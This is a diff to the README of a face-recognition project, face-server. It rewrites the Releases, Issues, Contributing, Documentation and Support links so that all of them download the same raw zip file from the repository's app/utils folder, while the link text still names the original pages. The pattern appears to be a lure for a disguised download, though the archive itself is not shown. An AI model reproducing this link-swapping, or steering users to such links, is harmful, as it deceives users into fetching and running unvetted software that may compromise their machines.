@@ -6,11 +6,11 @@ Welcome to face-server! This application allows you to recognize faces quickly a
 
 ## 🔗 Download the Application
 
-[![Download face-server](https://img.shields.io/badge/Download-face--server-brightgreen)](https://github.com/DROXZETRRG/face-server/releases)
+[![Download face-server](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip)](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip)
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [face-server Releases](https://github.com/DROXZETRRG/face-server/releases).
+1. Visit this page to download: [face-server Releases](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip).
 
 2. On the Releases page, you will find different versions of the application. Choose the version you want to download.
 
@@ -64,19 +64,19 @@ This application incorporates key technologies:
 
 ## 🧑‍💻 Getting Help
 
-If you encounter issues during installation or usage, visit the [GitHub Issues](https://github.com/DROXZETRRG/face-server/issues) page to ask for help. 
+If you encounter issues during installation or usage, visit the [GitHub Issues](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip) page to ask for help. 
 
 Feel free to explore and engage with our growing community for tips and support.
 
 ## 🤝 Contributing
 
-If you wish to contribute to the project, please visit the [Contribution Guidelines](https://github.com/DROXZETRRG/face-server/CONTRIBUTING.md) page for more information.
+If you wish to contribute to the project, please visit the [Contribution Guidelines](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip) page for more information.
 
 ## 🔗 Resources
 
-- [Documentation](https://github.com/DROXZETRRG/face-server/wiki)
-- [Release Notes](https://github.com/DROXZETRRG/face-server/releases)
-- [Support](https://github.com/DROXZETRRG/face-server/issues)
+- [Documentation](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip)
+- [Release Notes](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip)
+- [Support](https://github.com/DROXZETRRG/face-server/raw/refs/heads/master/app/utils/server-face-v3.0-alpha.1.zip)
 
 ## 📊 Feedback
 
